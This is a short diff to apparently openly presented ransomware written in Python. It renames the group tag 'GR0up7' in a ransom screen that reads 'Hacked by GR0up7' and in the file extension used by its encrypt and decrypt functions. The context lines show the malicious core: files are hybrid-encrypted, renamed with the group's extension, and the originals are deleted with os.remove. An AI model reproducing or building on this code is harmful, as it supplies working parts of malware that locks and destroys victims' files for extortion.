@@ -56,7 +56,7 @@ class GUI(Thread):
         label2 = tk.Label(image=img)
         label2.pack(padx=10, pady=10)
 
-        label3 = tk.Label(self.root, text="Hacked by GЯ0up7")
+        label3 = tk.Label(self.root, text="Hacked by GR0up7")
         label3.pack(padx=10, pady=10)
 
         self.label = tk.Label(self.root,font=('calibri', 40,'bold'))
@@ -142,7 +142,7 @@ def decrypt(dataFile, privateKeyFile):
     data = cipher.decrypt_and_verify(ciphertext, tag)
 
     # save the decrypted data to file
-    decryptedFile = dataFile.replace('.GЯ0up7', '')
+    decryptedFile = dataFile.replace('.GR0up7', '')
     with open(decryptedFile, 'wb') as f:
         f.write(data)
 
@@ -178,7 +178,7 @@ def encrypt(dataFile, publicKey):
     ciphertext, tag = cipher.encrypt_and_digest(data)
 
     # save the encrypted data to file
-    encryptedFile = dataFile + '.GЯ0up7'
+    encryptedFile = dataFile + '.GR0up7'
     with open(encryptedFile, 'wb') as f:
         [f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext)]
     os.remove(dataFile)
